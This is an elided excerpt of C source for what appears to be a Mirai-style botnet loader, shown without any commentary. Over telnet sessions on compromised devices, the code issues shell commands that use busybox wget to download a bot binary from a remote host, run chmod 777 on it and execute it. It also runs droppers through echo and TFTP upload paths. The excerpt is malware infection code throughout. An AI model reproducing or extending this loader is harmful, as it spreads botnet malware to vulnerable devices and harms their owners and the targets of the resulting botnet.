        ...
        while(TRUE)
        {
                ...
                switch(conn->state_telnet)
                {
                        ...
                        if(consumed)
                        {
                            ...
                            switch(conn->info.upload_method)
                            {
                                ...
                                case UPLOAD_WGET:
                                    ...
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/swrgiuhguhwrguiwetu/%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                    ...
                    case TELNET_UPLOAD_ECHO:
                        ...
                        if(consumed)
                        {
                            ...
                            if(strncmp(conn->info.arch, "arc", 3) == 0)
                                util_sockprintf(conn->fd, "./%s;./%s load.echo; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, conn->info.arch);
                            else
                                util_sockprintf(conn->fd, "./%s;./%s load.echo; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, conn->info.arch);
                    ...
                    case TELNET_UPLOAD_WGET:
                        ...
                        if(consumed > 0)
                        {
                            ...
                            #endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " load.wget; " EXEC_QUERY "\r\n", conn->info.arch);
            ...
            case TELNET_UPLOAD_TFTP:
                        ...
                        if(consumed > 0)
                        {
                            ...
                            #endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " load.tftp; " EXEC_QUERY "\r\n", conn->info.arch);
